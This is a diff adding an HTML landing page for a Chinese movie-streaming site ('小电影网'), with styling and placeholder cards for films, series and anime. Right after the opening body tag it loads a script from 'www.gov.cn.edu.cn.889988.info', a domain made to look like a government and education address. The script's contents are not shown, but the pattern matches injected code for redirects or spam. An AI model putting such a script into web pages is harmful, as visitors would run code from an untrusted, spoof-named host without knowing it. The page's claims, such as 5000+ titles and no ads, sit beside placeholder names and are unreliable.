@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>小电影网 - 高清影视在线观看平台</title>
+<meta name="description" content="小电影网提供最新电影、电视剧、动漫、综艺在线观看，支持手机端自适应，免费高清播放，极速访问。">
+<meta name="keywords" content="小电影网, 电影, 电视剧, 动漫, 综艺, 在线观看">
+<meta name="author" content="小电影网">
+<meta name="robots" content="index,follow">
+<link rel="canonical" href="https://xiaodianyingwang-h5.github.io/">
+
+<style>
+/* ===== 重置与全局 ===== */
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  background:#08090f;color:#d4d6e0;line-height:1.7;-webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit}
+img{display:block;max-width:100%}
+
+/* ===== 顶部通知条 ===== */
+.topbar{
+  background:#ff3b5c;color:#fff;text-align:center;font-size:.78rem;padding:6px 10px;
+}
+
+/* ===== 头部 ===== */
+.site-header{
+  background:#0d0f1a;border-bottom:1px solid #1e2138;padding:18px 16px;
+  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:12px;
+}
+.logo{font-size:1.5rem;font-weight:800;color:#ff3b5c;letter-spacing:1px}
+.logo small{display:block;font-size:.68rem;font-weight:400;color:#7b7f9a;letter-spacing:0}
+.site-header nav{display:flex;gap:6px;flex-wrap:wrap}
+.site-header nav a{
+  font-size:.85rem;padding:6px 12px;border-radius:6px;color:#c3c6d8;transition:.2s;
+}
+.site-header nav a:hover{background:#ff3b5c;color:#fff}
+
+/* ===== 通用区块 ===== */
+.section{
+  max-width:1120px;margin:0 auto;padding:44px 16px;
+}
+.sec-title{
+  font-size:1.35rem;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:8px;
+}
+.sec-sub{color:#7b7f9a;font-size:.85rem;margin-bottom:24px}
+
+/* ===== Hero ===== */
+.hero{
+  background:linear-gradient(135deg,#15132b,#0a0b13);
+  border-radius:16px;padding:40px 24px;text-align:center;margin-top:24px;
+  box-shadow:0 20px 60px rgba(255,59,92,.12);
+}
+.hero h1{font-size:1.8rem;margin-bottom:12px;color:#fff}
+.hero h1 em{font-style:normal;color:#ff3b5c}
+.hero p{color:#a8abc0;max-width:560px;margin:0 auto 20px}
+.hero .btn{
+  display:inline-block;background:#ff3b5c;color:#fff;padding:11px 28px;border-radius:30px;font-weight:600;
+}
+
+/* ===== 电影（瀑布流卡片） ===== */
+.grid{
+  display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:16px;
+}
+.card{
+  background:#111320;border-radius:12px;overflow:hidden;border:1px solid #1c1f30;
+  transition:.25s;
+}
+.card:hover{transform:translateY(-4px);border-color:#ff3b5c}
+.thumb{position:relative;aspect-ratio:3/4;background:#1a1d2e}
+.thumb span{
+  position:absolute;top:8px;left:8px;background:rgba(255,59,92,.9);color:#fff;font-size:.7rem;
+  padding:2px 8px;border-radius:4px;
+}
+.info{padding:10px 12px}
+.info h3{font-size:.92rem;color:#e8e9f0}
+.info p{font-size:.75rem;color:#6f7290;margin-top:4px}
+
+/* ===== 电视剧（横向滑动） ===== */
+.scroll{display:flex;gap:14px;overflow-x:auto;padding-bottom:10px;scrollbar-width:thin}
+.scroll::-webkit-scrollbar{height:6px}
+.scroll::-webkit-scrollbar-thumb{background:#2a2e45;border-radius:3px}
+.scroll-item{flex:0 0 200px;background:#111320;border-radius:12px;overflow:hidden}
+.scroll-item .thumb{aspect-ratio:16/9}
+.scroll-item .info h3{font-size:.9rem}
+
+/* ===== 动漫（左右交错） ===== */
+.alternate .row{
+  display:flex;gap:18px;align-items:center;margin-bottom:20px;background:#0f111c;border-radius:14px;padding:14px;
+}
+.alternate .row:nth-child(even){flex-direction:row-reverse}
+.alternate .thumb{flex:0 0 140px;aspect-ratio:1;border-radius:10px;background:#1a1d2e}
+.alternate .txt h3{color:#ff3b5c;margin-bottom:6px}
+.alternate .txt p{font-size:.85rem;color:#9a9db5}
+
+/* ===== 关于（数据面板） ===== */
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:14px}
+.stat{
+  background:#111320;border:1px solid #1e2138;border-radius:12px;padding:20px;text-align:center;
+}
+.stat b{display:block;font-size:1.6rem;color:#ff3b5c}
+.stat span{font-size:.8rem;color:#7b7f9a}
+
+/* ===== 页脚 ===== */
+.site-footer{
+  background:#06070c;border-top:1px solid #15172a;padding:28px 16px;text-align:center;font-size:.78rem;color:#5d607a;
+}
+.site-footer a{color:#7b7f9a;margin:0 8px}
+</style>
+</head>
+
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="topbar">小电影网 · 移动端自适应 · 极速访问 · 高清在线观看</div>
+
+<header class="site-header">
+  <div class="logo">小电影网<small>https://xiaodianyingwang-h5.github.io</small></div>
+  <nav>
+    <a href="#">首页</a>
+    <a href="#">电影</a>
+    <a href="#">电视剧</a>
+    <a href="#">动漫</a>
+    <a href="#">关于</a>
+  </nav>
+</header>
+
+<main class="section">
+
+  <!-- Hero -->
+  <div class="hero">
+    <h1>欢迎来到 <em>小电影网</em></h1>
+    <p>汇聚最新电影、热播电视剧、人气动漫与综艺，支持手机、平板、电脑多端自适应，随时随地畅快观看。</p>
+    <a class="btn" href="#">立即观看</a>
+  </div>
+
+  <!-- 电影 -->
+  <section id="movie">
+    <h2 class="sec-title">🎬 热门电影</h2>
+    <p class="sec-sub">最新上线 · 高清正片</p>
+    <div class="grid">
+      <div class="card">
+        <div class="thumb"><span>热门</span></div>
+        <div class="info"><h3>电影名称示例</h3><p>2026 · 动作 / 科幻</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"><span>推荐</span></div>
+        <div class="info"><h3>电影名称示例</h3><p>2026 · 爱情 / 剧情</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"></div>
+        <div class="info"><h3>电影名称示例</h3><p>2026 · 悬疑 / 犯罪</p></div>
+      </div>
+      <div class="card">
+        <div class="thumb"></div>
+        <div class="info"><h3>电影名称示例</h3><p>2026 · 喜剧 / 家庭</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 电视剧 -->
+  <section id="tv">
+    <h2 class="sec-title">📺 热播电视剧</h2>
+    <p class="sec-sub">持续更新 · 每日追更</p>
+    <div class="scroll">
+      <div class="scroll-item">
+        <div class="thumb"></div>
+        <div class="info"><h3>电视剧名称示例</h3><p>更新至12集</p></div>
+      </div>
+      <div class="scroll-item">
+        <div class="thumb"></div>
+        <div class="info"><h3>电视剧名称示例</h3><p>更新至08集</p></div>
+      </div>
+      <div class="scroll-item">
+        <div class="thumb"></div>
+        <div class="info"><h3>电视剧名称示例</h3><p>更新至20集</p></div>
+      </div>
+      <div class="scroll-item">
+        <div class="thumb"></div>
+        <div class="info"><h3>电视剧名称示例</h3><p>更新至05集</p></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 动漫 -->
+  <section id="anime" class="alternate">
+    <h2 class="sec-title">🌸 人气动漫</h2>
+    <p class="sec-sub">国漫日漫 · 同步追番</p>
+    <div class="row">
+      <div class="thumb"></div>
+      <div class="txt"><h3>动漫名称示例</h3><p>最新一集已上线，支持高清播放与弹幕互动。</p></div>
+    </div>
+    <div class="row">
+      <div class="thumb"></div>
+      <div class="txt"><h3>动漫名称示例</h3><p>经典续作回归，每周准时更新，告别剧荒。</p></div>
+    </div>
+    <div class="row">
+      <div class="thumb"></div>
+      <div class="txt"><h3>动漫名称示例</h3><p>热血冒险题材，画面精良，剧情紧凑。</p></div>
+    </div>
+  </section>
+
+  <!-- 关于 -->
+  <section id="about">
+    <h2 class="sec-title">ℹ️ 关于本站</h2>
+    <p class="sec-sub">小电影网 · 网站信息</p>
+    <div class="stats">
+      <div class="stat"><b>5000+</b><span>影视资源</span></div>
+      <div class="stat"><b>4K</b><span>高清画质</span></div>
+      <div class="stat"><b>0</b><span>广告干扰</span></div>
+      <div class="stat"><b>24h</b><span>极速更新</span></div>
+    </div>
+  </section>
+
+</main>
+
+<footer class="site-footer">
+  <div>© 2026 小电影网 · 本站内容仅供学习交流使用</div>
+  <div style="margin-top:8px">
+    <a href="#">首页</a>|
+    <a href="#">电影</a>|
+    <a href="#">电视剧</a>|
+    <a href="#">动漫</a>
+  </div>
+  <div style="margin-top:8px">https://xiaodianyingwang-h5.github.io</div>
+</footer>
+
+</body>
+</html>
